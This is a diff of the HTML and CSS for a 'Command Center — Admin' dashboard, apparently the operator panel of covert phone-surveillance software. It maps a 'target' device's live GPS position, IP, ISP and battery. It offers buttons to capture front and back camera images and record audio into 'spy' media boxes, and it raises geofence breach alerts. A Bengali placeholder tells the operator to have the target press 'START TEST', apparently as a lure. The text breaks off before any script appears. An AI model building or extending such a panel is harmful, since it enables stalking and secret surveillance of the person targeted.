@@ -4,19 +4,16 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Command Center — Admin</title>
-    <meta name="description" content="Secure Admin Command Center Panel">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
     <style>
         *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
         :root {
             --bg: #060812;
-            --panel: rgba(10, 15, 30, 0.92);
+            --panel: rgba(8, 12, 25, 0.96);
             --surface: rgba(255,255,255,0.04);
-            --border: rgba(255,255,255,0.08);
-            --border-accent: rgba(56,189,248,0.25);
+            --border: rgba(255,255,255,0.07);
+            --border-accent: rgba(56,189,248,0.2);
             --accent: #38bdf8;
             --accent2: #818cf8;
             --green: #10b981;
@@ -26,852 +23,727 @@
             --pink: #ec4899;
             --text: #f1f5f9;
             --muted: #64748b;
-            --panel-width: 360px;
+            --panel-w: 350px;
         }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); overflow: hidden; height: 100vh; width: 100vw; }
 
-        body {
-            font-family: 'Inter', sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            overflow: hidden;
-            height: 100vh;
-            width: 100vw;
-        }
+        /* Map */
+        #map { position: absolute; inset: 0; z-index: 1; }
+        .leaflet-tile-pane { filter: brightness(0.82) saturate(1.15) hue-rotate(5deg); }
+        .leaflet-control-zoom a { background: rgba(10,15,30,0.9) !important; color: var(--accent) !important; border-color: var(--border-accent) !important; }
+        .leaflet-control-layers { background: rgba(8,12,25,0.95) !important; border: 1px solid var(--border-accent) !important; border-radius: 10px !important; padding: 8px !important; }
+        .leaflet-control-layers label, .leaflet-control-layers-base span { color: var(--text) !important; font-size: 13px; }
 
-        /* ── Map ── */
-        #map {
-            position: absolute;
-            inset: 0;
-            z-index: 1;
-        }
-        .leaflet-tile-pane { filter: brightness(0.85) saturate(1.1); }
-        .leaflet-control-layers { background: rgba(10,15,30,0.9) !important; border: 1px solid var(--border-accent) !important; color: var(--text) !important; border-radius: 10px !important; }
-        .leaflet-control-layers label { color: var(--text) !important; }
-
-        /* ── Panel Toggle Btn ── */
+        /* Show Panel Btn */
         #showPanelBtn {
-            display: none;
-            position: absolute;
-            top: 16px;
-            left: 16px;
-            z-index: 1000;
-            background: rgba(10,15,30,0.9);
-            color: var(--accent);
-            border: 1px solid var(--border-accent);
-            padding: 10px 16px;
-            border-radius: 10px;
-            cursor: pointer;
-            font-weight: 600;
-            font-size: 13px;
-            backdrop-filter: blur(12px);
-            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-            transition: 0.2s;
+            display: none; position: absolute; top: 16px; left: 16px; z-index: 1000;
+            background: rgba(8,12,25,0.92); color: var(--accent);
+            border: 1px solid var(--border-accent); padding: 10px 16px; border-radius: 10px;
+            cursor: pointer; font-weight: 600; font-size: 13px;
+            backdrop-filter: blur(14px); box-shadow: 0 4px 20px rgba(0,0,0,0.5); transition: 0.2s;
         }
         #showPanelBtn:hover { background: rgba(56,189,248,0.1); }
 
-        /* ── Side Panel ── */
+        /* Scan Line Effect on map corner */
+        .map-hud {
+            position: absolute; bottom: 20px; left: calc(var(--panel-w) + 20px); z-index: 500;
+            display: flex; gap: 10px;
+        }
+        .hud-chip {
+            background: rgba(8,12,25,0.88); backdrop-filter: blur(14px);
+            border: 1px solid var(--border-accent); border-radius: 8px;
+            padding: 6px 12px; font-size: 11px; color: var(--muted);
+            display: flex; align-items: center; gap: 6px;
+        }
+        .hud-chip .val { color: var(--text); font-weight: 600; font-family: 'Orbitron', monospace; font-size: 12px; }
+
+        /* Side Panel */
         .panel {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: var(--panel-width);
-            height: 100%;
-            z-index: 900;
-            background: var(--panel);
-            border-right: 1px solid var(--border-accent);
-            backdrop-filter: blur(20px);
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-            box-shadow: 4px 0 40px rgba(0,0,0,0.6);
-            transition: transform 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+            position: absolute; top: 0; left: 0;
+            width: var(--panel-w); height: 100%; z-index: 900;
+            background: var(--panel); border-right: 1px solid var(--border-accent);
+            backdrop-filter: blur(24px); display: flex; flex-direction: column;
+            overflow: hidden; box-shadow: 6px 0 50px rgba(0,0,0,0.7);
+            transition: transform 0.35s cubic-bezier(0.4,0,0.2,1);
         }
         .panel.hidden { transform: translateX(-100%); }
 
-        /* ── Panel Header ── */
+        /* Panel Header */
         .panel-header {
-            padding: 18px 20px 16px;
+            padding: 16px 18px 14px;
             border-bottom: 1px solid var(--border);
             flex-shrink: 0;
-            background: rgba(56,189,248,0.04);
+            background: linear-gradient(180deg, rgba(56,189,248,0.06) 0%, transparent 100%);
         }
         .panel-brand {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 13px;
-            font-weight: 700;
-            letter-spacing: 2px;
+            font-family: 'Orbitron', sans-serif; font-size: 12px; font-weight: 700;
+            letter-spacing: 2.5px;
             background: linear-gradient(135deg, var(--accent), var(--accent2));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            margin-bottom: 8px;
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+            margin-bottom: 10px; display: flex; align-items: center; gap: 8px;
         }
-        .panel-status-row {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-        .status-indicator {
-            display: flex;
-            align-items: center;
-            gap: 7px;
-            font-size: 12px;
-        }
-        .status-dot {
-            width: 8px; height: 8px;
-            border-radius: 50%;
-            background: var(--muted);
-            transition: background 0.3s, box-shadow 0.3s;
-        }
-        .status-dot.live {
-            background: var(--green);
-            box-shadow: 0 0 10px var(--green);
-            animation: blink 1.5s ease-in-out infinite;
-        }
-        .status-dot.offline { background: var(--red); box-shadow: 0 0 8px var(--red); }
-        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.4} }
+        .brand-ping { width: 6px; height: 6px; border-radius: 50%; background: var(--accent); box-shadow: 0 0 8px var(--accent); animation: orbitPing 2s ease-in-out infinite; }
+        @keyframes orbitPing { 0%,100%{transform:scale(1);opacity:1} 50%{transform:scale(1.5);opacity:0.5} }
 
-        .status-text { font-weight: 600; font-size: 12px; }
+        .panel-status-row { display: flex; align-items: center; justify-content: space-between; }
+        .status-indicator { display: flex; align-items: center; gap: 7px; }
+        .status-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--muted); transition: all 0.4s; }
+        .status-dot.live { background: var(--green); box-shadow: 0 0 12px var(--green); animation: liveBlink 1.5s ease-in-out infinite; }
+        .status-dot.offline { background: var(--red); box-shadow: 0 0 10px var(--red); }
+        @keyframes liveBlink { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.4;transform:scale(0.7)} }
+        .status-text { font-weight: 700; font-size: 12px; color: var(--muted); }
         .status-text.live { color: var(--green); }
         .status-text.offline { color: var(--red); }
-        .status-time { font-size: 11px; color: var(--muted); }
+        .status-time { font-size: 10px; color: var(--muted); font-variant-numeric: tabular-nums; }
+        .hide-btn { background: transparent; border: 1px solid rgba(100,116,139,0.3); color: var(--muted); padding: 4px 9px; border-radius: 6px; cursor: pointer; font-size: 11px; font-weight: 600; transition: 0.2s; }
+        .hide-btn:hover { border-color: var(--red); color: var(--red); }
 
-        .hide-btn {
-            background: transparent;
-            border: 1px solid rgba(244,63,94,0.3);
-            color: var(--red);
-            padding: 4px 10px;
-            border-radius: 7px;
-            cursor: pointer;
-            font-size: 11px;
-            font-weight: 600;
-            transition: 0.2s;
-        }
-        .hide-btn:hover { background: rgba(244,63,94,0.1); }
-
-        /* ── Panel Scroll Area ── */
-        .panel-body {
-            flex: 1;
-            overflow-y: auto;
-            padding: 16px;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-        .panel-body::-webkit-scrollbar { width: 4px; }
+        /* Panel Body */
+        .panel-body { flex: 1; overflow-y: auto; padding: 14px; display: flex; flex-direction: column; gap: 10px; }
+        .panel-body::-webkit-scrollbar { width: 3px; }
         .panel-body::-webkit-scrollbar-thumb { background: var(--border-accent); border-radius: 99px; }
 
-        /* ── Section ── */
-        .section {
-            background: var(--surface);
-            border: 1px solid var(--border);
-            border-radius: 14px;
-            padding: 14px;
-        }
-        .section-title {
-            font-size: 10px;
-            font-weight: 700;
-            color: var(--muted);
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .section-title::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background: var(--border);
-        }
-
-        /* ── Address Box ── */
+        /* Address Box */
         .address-box {
-            display: flex;
-            align-items: flex-start;
-            gap: 8px;
-            background: rgba(16,185,129,0.08);
-            border: 1px solid rgba(16,185,129,0.2);
-            border-radius: 10px;
-            padding: 10px 12px;
-            font-size: 12px;
-            line-height: 1.6;
-            color: #cbd5e1;
+            display: flex; align-items: flex-start; gap: 8px;
+            background: rgba(16,185,129,0.07); border: 1px solid rgba(16,185,129,0.18);
+            border-radius: 10px; padding: 10px 12px; font-size: 12px; line-height: 1.7; color: #cbd5e1;
+            transition: border-color 0.3s;
         }
-        .address-box .addr-icon { font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+        .address-box.error { background: rgba(244,63,94,0.07); border-color: rgba(244,63,94,0.2); }
+        .addr-icon { font-size: 15px; flex-shrink: 0; margin-top: 2px; }
 
-        /* ── Info Grid ── */
-        .info-grid {
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-        }
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 7px 10px;
-            background: rgba(0,0,0,0.25);
-            border-radius: 8px;
-            font-size: 12px;
-        }
+        /* Section */
+        .section { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 12px; }
+        .section-title { font-size: 9px; font-weight: 700; color: var(--muted); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 9px; display: flex; align-items: center; gap: 5px; }
+        .section-title::after { content:''; flex:1; height:1px; background:var(--border); }
+
+        /* Info Rows */
+        .info-grid { display: flex; flex-direction: column; gap: 5px; }
+        .info-row { display: flex; justify-content: space-between; align-items: center; padding: 6px 9px; background: rgba(0,0,0,0.2); border-radius: 7px; font-size: 11.5px; }
         .info-label { color: var(--muted); font-weight: 500; }
-        .info-value { font-weight: 600; color: var(--text); text-align: right; max-width: 60%; word-break: break-all; }
-        .info-value.highlight { color: var(--accent); }
+        .info-value { font-weight: 600; color: var(--text); text-align: right; max-width: 62%; word-break: break-all; font-size: 11px; }
+        .info-value.accent { color: var(--accent); font-family: 'Orbitron', monospace; font-size: 10.5px; }
+        .info-value.green { color: var(--green); }
+        .info-value.orange { color: var(--orange); }
 
-        /* ── Speed Indicator ── */
-        .speed-bar-wrap { margin-top: 4px; }
-        .speed-bar-track {
-            height: 4px;
-            background: var(--border);
-            border-radius: 99px;
-            overflow: hidden;
-            margin-top: 4px;
-        }
-        .speed-bar-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, var(--green), var(--accent));
-            border-radius: 99px;
-            transition: width 1s ease;
-        }
+        /* Movement Cards */
+        .move-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; }
+        .move-card { background: rgba(0,0,0,0.3); border-radius: 9px; padding: 9px 6px; text-align: center; border: 1px solid var(--border); }
+        .move-card .mv { font-family: 'Orbitron', sans-serif; font-size: 16px; font-weight: 700; color: var(--accent); }
+        .move-card .ml { font-size: 9px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-top: 2px; }
+        .speed-track { height: 3px; background: var(--border); border-radius: 99px; overflow: hidden; margin-top: 8px; }
+        .speed-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--green), var(--accent)); border-radius: 99px; transition: width 1.2s ease; }
 
-        /* ── Action Buttons ── */
-        .btn-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px;
-        }
+        /* Buttons */
+        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 7px; }
         .btn-grid .full { grid-column: 1 / -1; }
-
         .action-btn {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            padding: 10px 12px;
-            border: none;
-            border-radius: 10px;
-            font-size: 12px;
-            font-weight: 700;
-            cursor: pointer;
-            color: white;
-            transition: transform 0.15s, opacity 0.2s, box-shadow 0.2s;
-            letter-spacing: 0.3px;
-            position: relative;
-            overflow: hidden;
+            display: flex; align-items: center; justify-content: center; gap: 5px;
+            padding: 9px 10px; border: none; border-radius: 9px; font-size: 11.5px;
+            font-weight: 700; cursor: pointer; color: white;
+            transition: transform 0.15s, box-shadow 0.2s; letter-spacing: 0.2px;
+            position: relative; overflow: hidden;
         }
-        .action-btn::after {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: rgba(255,255,255,0.1);
-            opacity: 0;
-            transition: opacity 0.2s;
-        }
-        .action-btn:hover::after { opacity: 1; }
-        .action-btn:active { transform: scale(0.95); }
+        .action-btn::before { content:''; position:absolute; inset:0; background:rgba(255,255,255,0.12); opacity:0; transition:opacity 0.2s; }
+        .action-btn:hover::before { opacity: 1; }
+        .action-btn:active { transform: scale(0.94); }
+        .btn-ring { background: linear-gradient(135deg, #ef4444, #b91c1c); box-shadow: 0 3px 12px rgba(239,68,68,0.25); }
+        .btn-front { background: linear-gradient(135deg, #8b5cf6, #6d28d9); box-shadow: 0 3px 12px rgba(139,92,246,0.25); }
+        .btn-back { background: linear-gradient(135deg, #6366f1, #4338ca); box-shadow: 0 3px 12px rgba(99,102,241,0.25); }
+        .btn-audio { background: linear-gradient(135deg, #ec4899, #be185d); box-shadow: 0 3px 12px rgba(236,72,153,0.25); }
+        .btn-audio-long { background: linear-gradient(135deg, #f43f5e, #9f1239); box-shadow: 0 3px 12px rgba(244,63,94,0.25); }
+        .btn-geo { background: linear-gradient(135deg, #f59e0b, #b45309); box-shadow: 0 3px 12px rgba(245,158,11,0.25); }
+        .btn-geo.on { background: linear-gradient(135deg, #10b981, #047857); box-shadow: 0 3px 12px rgba(16,185,129,0.25); }
+        .btn-clear-route { background: linear-gradient(135deg, #475569, #334155); box-shadow: none; }
 
-        .btn-ring { background: linear-gradient(135deg, #ef4444, #dc2626); box-shadow: 0 4px 15px rgba(239,68,68,0.3); }
-        .btn-front { background: linear-gradient(135deg, #8b5cf6, #7c3aed); box-shadow: 0 4px 15px rgba(139,92,246,0.3); }
-        .btn-back { background: linear-gradient(135deg, #6366f1, #4f46e5); box-shadow: 0 4px 15px rgba(99,102,241,0.3); }
-        .btn-audio { background: linear-gradient(135deg, #ec4899, #db2777); box-shadow: 0 4px 15px rgba(236,72,153,0.3); }
-        .btn-geo { background: linear-gradient(135deg, #f59e0b, #d97706); box-shadow: 0 4px 15px rgba(245,158,11,0.3); }
-        .btn-geo.active { background: linear-gradient(135deg, #10b981, #059669); box-shadow: 0 4px 15px rgba(16,185,129,0.3); }
-
-        /* ── Media Boxes ── */
-        .media-section {
-            display: none;
-            background: var(--surface);
-            border: 1px dashed var(--border-accent);
-            border-radius: 14px;
-            padding: 14px;
-        }
+        /* Media Boxes */
+        .media-section { display: none; background: var(--surface); border: 1px dashed var(--border-accent); border-radius: 12px; padding: 12px; }
         .media-section.visible { display: block; }
+        .media-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; }
+        .media-title { font-size: 10px; font-weight: 700; color: var(--muted); text-transform: uppercase; letter-spacing: 1.5px; }
+        .media-badge { padding: 2px 7px; border-radius: 99px; font-size: 9.5px; font-weight: 700; }
+        .badge-wait { background: rgba(245,158,11,0.15); color: var(--orange); }
+        .badge-ok { background: rgba(16,185,129,0.15); color: var(--green); }
+        .badge-err { background: rgba(244,63,94,0.15); color: var(--red); }
 
-        .media-label {
-            font-size: 11px;
-            font-weight: 600;
-            color: var(--muted);
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            margin-bottom: 8px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .media-badge {
-            padding: 2px 8px;
-            border-radius: 99px;
-            font-size: 10px;
-            font-weight: 700;
-        }
-        .badge-waiting { background: rgba(245,158,11,0.2); color: var(--orange); }
-        .badge-ok { background: rgba(16,185,129,0.2); color: var(--green); }
-        .badge-err { background: rgba(244,63,94,0.2); color: var(--red); }
+        .spy-img { width: 100%; border-radius: 7px; display: none; border: 1px solid var(--border); margin-top: 6px; }
+        .spy-img.show { display: block; }
+        .spy-audio { width: 100%; display: none; margin-top: 7px; border-radius: 7px; }
+        .spy-audio.show { display: block; }
+        .media-btns { display: flex; gap: 5px; margin-top: 8px; }
+        .media-btns a, .media-btns button { flex:1; padding:6px; font-size:11px; font-weight:700; border:none; border-radius:7px; cursor:pointer; text-align:center; text-decoration:none; transition:opacity 0.2s; }
+        .m-dl { background: rgba(16,185,129,0.15); color: var(--green); border: 1px solid rgba(16,185,129,0.25) !important; }
+        .m-del { background: rgba(244,63,94,0.15); color: var(--red); border: 1px solid rgba(244,63,94,0.25) !important; }
+        .media-btns a:hover, .media-btns button:hover { opacity: 0.75; }
 
-        .spy-img { width: 100%; border-radius: 8px; margin-top: 6px; display: none; border: 1px solid var(--border); }
-        .spy-img.visible { display: block; }
+        /* Route History mini list */
+        .route-log { max-height: 80px; overflow-y: auto; margin-top: 6px; }
+        .route-log-item { font-size: 10px; color: var(--muted); padding: 3px 0; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; }
+        .route-log-item:last-child { border-bottom: none; }
 
-        .spy-audio { width: 100%; margin-top: 8px; border-radius: 8px; display: none; }
-        .spy-audio.visible { display: block; }
-        audio::-webkit-media-controls-panel { background: rgba(30,41,59,0.9); }
+        /* Map Marker */
+        .smart-marker { text-align: center; font-size: 30px; filter: drop-shadow(0 2px 8px rgba(0,0,0,0.7)); transition: transform 0.4s; }
 
-        .media-actions {
-            display: flex;
-            gap: 6px;
-            margin-top: 10px;
-        }
-        .media-actions a, .media-actions button {
-            flex: 1;
-            padding: 7px;
-            font-size: 11px;
-            font-weight: 700;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            text-align: center;
-            text-decoration: none;
-            transition: opacity 0.2s;
-        }
-        .media-actions a:hover, .media-actions button:hover { opacity: 0.8; }
-        .btn-dl { background: rgba(16,185,129,0.2); color: var(--green); border: 1px solid rgba(16,185,129,0.3) !important; }
-        .btn-del { background: rgba(244,63,94,0.2); color: var(--red); border: 1px solid rgba(244,63,94,0.3) !important; }
-
-        /* ── Route Info ── */
-        .route-stat {
-            display: flex;
-            gap: 8px;
-        }
-        .route-card {
-            flex: 1;
-            background: rgba(0,0,0,0.3);
-            border-radius: 10px;
-            padding: 10px;
-            text-align: center;
-        }
-        .route-card .r-val {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 18px;
-            font-weight: 700;
-            color: var(--accent);
-        }
-        .route-card .r-lbl { font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-top: 2px; }
-
-        /* ── Map Marker ── */
-        .smart-marker { text-align: center; font-size: 32px; filter: drop-shadow(0 2px 8px rgba(0,0,0,0.6)); transition: transform 0.4s; }
-
-        /* ── Notification Toast ── */
+        /* Toast */
         #toast {
-            position: fixed;
-            bottom: 24px;
-            right: 24px;
-            z-index: 9999;
-            background: rgba(10,15,30,0.95);
-            border: 1px solid var(--border-accent);
-            color: var(--text);
-            padding: 12px 18px;
-            border-radius: 12px;
-            font-size: 13px;
-            font-weight: 500;
-            backdrop-filter: blur(16px);
-            box-shadow: 0 8px 32px rgba(0,0,0,0.6);
-            display: none;
-            animation: slideUp 0.3s ease;
-            max-width: 280px;
+            position: fixed; bottom: 20px; right: 20px; z-index: 9999;
+            background: rgba(8,12,25,0.96); border: 1px solid var(--border-accent);
+            color: var(--text); padding: 11px 16px; border-radius: 11px;
+            font-size: 13px; font-weight: 500; backdrop-filter: blur(16px);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.6); display: none;
+            animation: toastIn 0.3s ease; max-width: 260px; line-height: 1.4;
         }
-        #toast.success { border-color: rgba(16,185,129,0.4); }
-        #toast.error { border-color: rgba(244,63,94,0.4); }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        #toast.success { border-color: rgba(16,185,129,0.35); }
+        #toast.error { border-color: rgba(244,63,94,0.35); }
+        #toast.info { border-color: rgba(56,189,248,0.35); }
+        @keyframes toastIn { from{opacity:0;transform:translateY(16px)} to{opacity:1;transform:translateY(0)} }
 
-        /* ── Geofence Alert ── */
+        /* Geofence Alert */
         #geoAlert {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 9999;
-            background: rgba(10,15,30,0.98);
-            border: 2px solid var(--red);
-            border-radius: 20px;
-            padding: 32px;
-            text-align: center;
-            backdrop-filter: blur(20px);
-            box-shadow: 0 0 60px rgba(244,63,94,0.4);
-            animation: alertPulse 0.5s ease;
-            max-width: 320px;
-            width: 90%;
+            display: none; position: fixed; top: 50%; left: 50%;
+            transform: translate(-50%,-50%); z-index: 9999;
+            background: rgba(8,12,25,0.98); border: 2px solid var(--red);
+            border-radius: 18px; padding: 28px 24px; text-align: center;
+            backdrop-filter: blur(20px); box-shadow: 0 0 60px rgba(244,63,94,0.35);
+            max-width: 300px; width: 90%; animation: alertAppear 0.4s ease;
         }
-        @keyframes alertPulse { from { transform: translate(-50%,-50%) scale(0.8); opacity: 0; } to { transform: translate(-50%,-50%) scale(1); opacity: 1; } }
-        #geoAlert h3 { color: var(--red); font-size: 20px; margin-bottom: 8px; }
-        #geoAlert p { color: var(--muted); font-size: 13px; line-height: 1.6; }
-        #closeGeoAlert { margin-top: 20px; background: var(--red); color: white; border: none; padding: 10px 24px; border-radius: 10px; cursor: pointer; font-weight: 700; font-size: 13px; }
+        @keyframes alertAppear { from{transform:translate(-50%,-50%) scale(0.8);opacity:0} to{transform:translate(-50%,-50%) scale(1);opacity:1} }
+        #geoAlert .geo-icon { font-size: 36px; margin-bottom: 10px; }
+        #geoAlert h3 { color: var(--red); font-size: 18px; margin-bottom: 6px; }
+        #geoAlert p { color: var(--muted); font-size: 12px; line-height: 1.6; }
+        #geoAlert button { margin-top: 16px; background: var(--red); color: white; border: none; padding: 9px 24px; border-radius: 9px; cursor: pointer; font-weight: 700; font-size: 13px; }
 
-        /* ── Responsive ── */
-        @media (max-width: 400px) {
-            :root { --panel-width: 100vw; }
-            .panel { border-right: none; }
+        /* Confirm Dialog */
+        #confirmDialog {
+            display: none; position: fixed; top: 50%; left: 50%;
+            transform: translate(-50%,-50%); z-index: 9999;
+            background: rgba(8,12,25,0.98); border: 1px solid var(--border-accent);
+            border-radius: 16px; padding: 24px; text-align: center;
+            backdrop-filter: blur(20px); box-shadow: 0 8px 40px rgba(0,0,0,0.7);
+            max-width: 280px; width: 88%;
         }
+        #confirmDialog p { font-size: 13px; color: var(--muted); margin-bottom: 16px; line-height: 1.6; }
+        .confirm-btns { display: flex; gap: 8px; }
+        .confirm-btns button { flex:1; padding: 9px; border: none; border-radius: 9px; font-weight: 700; font-size: 12px; cursor: pointer; }
+        .confirm-yes { background: var(--red); color: white; }
+        .confirm-no { background: var(--surface); color: var(--muted); border: 1px solid var(--border) !important; }
 
-        /* Scrollbar */
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-thumb { background: rgba(56,189,248,0.2); border-radius: 99px; }
+        /* Overlay backdrop */
+        .overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 9998; backdrop-filter: blur(4px); }
+        .overlay.show { display: block; }
+
+        @media (max-width: 400px) { :root { --panel-w: 100vw; } .panel { border-right: none; } .map-hud { left: 12px; } }
+        ::-webkit-scrollbar { width: 3px; }
+        ::-webkit-scrollbar-thumb { background: rgba(56,189,248,0.15); border-radius: 99px; }
     </style>
 </head>
 <body>
 
-    <div id="map"></div>
+<div id="map"></div>
 
-    <!-- Show Panel Button (visible when panel is hidden) -->
-    <button id="showPanelBtn" onclick="togglePanel(true)">🛰 Show Panel</button>
+<!-- HUD chips on map -->
+<div class="map-hud" id="mapHud" style="display:none;">
+    <div class="hud-chip">🌐 <span id="hudIp" class="val">--</span></div>
+    <div class="hud-chip">🔋 <span id="hudBat" class="val">--</span></div>
+    <div class="hud-chip">⚡ <span id="hudSpeed" class="val">0 km/h</span></div>
+</div>
 
-    <!-- Toast Notification -->
-    <div id="toast"></div>
+<button id="showPanelBtn" onclick="togglePanel(true)">🛰 Panel</button>
 
-    <!-- Geofence Alert -->
-    <div id="geoAlert">
-        <h3>⚠️ Geofence Alert!</h3>
-        <p id="geoAlertMsg">Target has moved outside the geofence boundary!</p>
-        <button id="closeGeoAlert" onclick="document.getElementById('geoAlert').style.display='none'">Dismiss</button>
+<!-- Toast & Confirm -->
+<div id="toast"></div>
+<div class="overlay" id="overlay"></div>
+
+<!-- Geofence Alert -->
+<div id="geoAlert">
+    <div class="geo-icon">🚨</div>
+    <h3>Geofence Breach!</h3>
+    <p id="geoAlertMsg">Target has left the safe zone!</p>
+    <button onclick="closeGeoAlert()">Dismiss</button>
+</div>
+
+<!-- Confirm Dialog -->
+<div id="confirmDialog">
+    <p id="confirmMsg">Are you sure?</p>
+    <div class="confirm-btns">
+        <button class="confirm-yes" id="confirmYes">Yes, Delete</button>
+        <button class="confirm-no" onclick="closeConfirm()">Cancel</button>
+    </div>
+</div>
+
+<!-- Side Panel -->
+<div class="panel" id="mainPanel">
+
+    <!-- Header -->
+    <div class="panel-header">
+        <div class="panel-brand">
+            <div class="brand-ping"></div>
+            COMMAND CENTER
+        </div>
+        <div class="panel-status-row">
+            <div class="status-indicator">
+                <div class="status-dot" id="statusDot"></div>
+                <span class="status-text" id="statusText">Waiting...</span>
+            </div>
+            <span class="status-time" id="lastSeenTime"></span>
+            <button class="hide-btn" onclick="togglePanel(false)">✕</button>
+        </div>
     </div>
 
-    <!-- Side Panel -->
-    <div class="panel" id="mainPanel">
+    <!-- Body -->
+    <div class="panel-body">
 
-        <!-- Header -->
-        <div class="panel-header">
-            <div class="panel-brand">⬡ COMMAND CENTER</div>
-            <div class="panel-status-row">
-                <div class="status-indicator">
-                    <div class="status-dot" id="statusDot"></div>
-                    <span class="status-text" id="statusText">Waiting...</span>
+        <!-- Address -->
+        <div class="address-box" id="addressBox">
+            <span class="addr-icon">📍</span>
+            <span id="addressUI">GPS data আসছে... target device-এ START TEST চাপুন।</span>
+        </div>
+
+        <!-- Device Info -->
+        <div class="section">
+            <div class="section-title">📱 Device Info</div>
+            <div class="info-grid">
+                <div class="info-row"><span class="info-label">Device</span><span class="info-value" id="deviceUI">--</span></div>
+                <div class="info-row"><span class="info-label">Battery</span><span class="info-value green" id="batUI">--</span></div>
+                <div class="info-row"><span class="info-label">IP Address</span><span class="info-value accent" id="ipUI">--</span></div>
+                <div class="info-row"><span class="info-label">ISP / Network</span><span class="info-value" id="ispUI">--</span></div>
+                <div class="info-row"><span class="info-label">GPS Accuracy</span><span class="info-value orange" id="accUI">--</span></div>
+                <div class="info-row">
+                    <span class="info-label">Open in Maps</span>
+                    <a id="mapsLink" href="#" target="_blank" style="font-size:11px;color:var(--accent);font-weight:700;text-decoration:none;">Google Maps ↗</a>
                 </div>
-                <div class="status-time" id="lastSeenTime"></div>
-                <button class="hide-btn" onclick="togglePanel(false)">✕ Hide</button>
             </div>
         </div>
 
-        <!-- Body -->
-        <div class="panel-body">
-
-            <!-- Address -->
-            <div class="address-box">
-                <span class="addr-icon">📍</span>
-                <span id="addressUI">Waiting for GPS data...</span>
+        <!-- Coordinates -->
+        <div class="section">
+            <div class="section-title">🌐 Coordinates</div>
+            <div class="info-grid">
+                <div class="info-row"><span class="info-label">Latitude</span><span class="info-value accent" id="latUI">--</span></div>
+                <div class="info-row"><span class="info-label">Longitude</span><span class="info-value accent" id="lngUI">--</span></div>
             </div>
+        </div>
 
-            <!-- Device Info -->
-            <div class="section">
-                <div class="section-title">📱 Device Info</div>
-                <div class="info-grid">
-                    <div class="info-row">
-                        <span class="info-label">Device</span>
-                        <span class="info-value" id="deviceUI">--</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Battery</span>
-                        <span class="info-value highlight" id="batUI">--</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">IP Address</span>
-                        <span class="info-value" id="ipUI">--</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Network/ISP</span>
-                        <span class="info-value" id="ispUI">--</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Accuracy</span>
-                        <span class="info-value" id="accUI">--</span>
-                    </div>
-                </div>
+        <!-- Movement -->
+        <div class="section">
+            <div class="section-title">🚀 Movement</div>
+            <div class="move-grid">
+                <div class="move-card"><div class="mv" id="speedUI">0</div><div class="ml">km/h</div></div>
+                <div class="move-card"><div class="mv" id="headingUI">0°</div><div class="ml">Heading</div></div>
+                <div class="move-card"><div class="mv" id="pointsUI">0</div><div class="ml">Points</div></div>
             </div>
+            <div class="speed-track"><div class="speed-fill" id="speedFill"></div></div>
+        </div>
 
-            <!-- Speed / Movement -->
-            <div class="section">
-                <div class="section-title">🚀 Movement</div>
-                <div class="route-stat">
-                    <div class="route-card">
-                        <div class="r-val" id="speedUI">0</div>
-                        <div class="r-lbl">km/h</div>
-                    </div>
-                    <div class="route-card">
-                        <div class="r-val" id="headingUI">0°</div>
-                        <div class="r-lbl">Heading</div>
-                    </div>
